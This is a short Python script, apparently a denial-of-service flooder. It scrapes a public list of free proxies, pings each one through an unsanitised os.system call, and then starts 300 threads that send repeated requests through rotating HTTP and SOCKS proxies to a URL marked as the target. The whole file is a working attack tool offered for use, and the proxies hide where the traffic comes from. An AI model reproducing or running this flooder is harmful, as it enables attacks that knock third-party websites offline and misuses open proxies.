#!/usr/bin/env python3

import requests
import random
import re
import threading
import os

url = 'http://www.icanhazip.com' #TARGET
def get_proxies():
	proxies = []
	res = requests.get('https://free-proxy-list.net').text
	p = re.findall('(\d+\.\d+\.\d+\.\d+):(\d+)',res)
	for proxy in p:
		response = os.system("ping -c 1 " + proxy[0])
		if response == 0:
                        print (proxy[0], 'is up!')
                        proxies.append(proxy[0]+':'+proxy[1])
	return proxies

def attack(proxies):
	s= requests.Session()
	proxy = random.choice(proxies)
	for proxy in proxies:
		for i in range(100):
			try:
				s.proxies = {"http":proxy,"https":proxy}
				res = s.get(url,timeout = 6)
				print(res.text)
			except Exception as e:
				try:
					s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
					res = s.get(url,timeout = 1.5)
					print(res.text)
				except Exception as e:
					try:
						s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
						res = s.get(url,timeout =1.5)
						print(res.text)
					except Exception as e:
						print("failed")
						return 0

if __name__ == "__main__":
	print("START!")
	print("It takes a while to get started please be patient you can force quit by long pressing ctrl+c ")
	proxies = get_proxies()
	print("Up proxies:")
	print(proxies)
	print("Party starts in 321..............")
	for i in range(300):
		t = threading.Thread(target=attack, args=(proxies,))
		t.start()

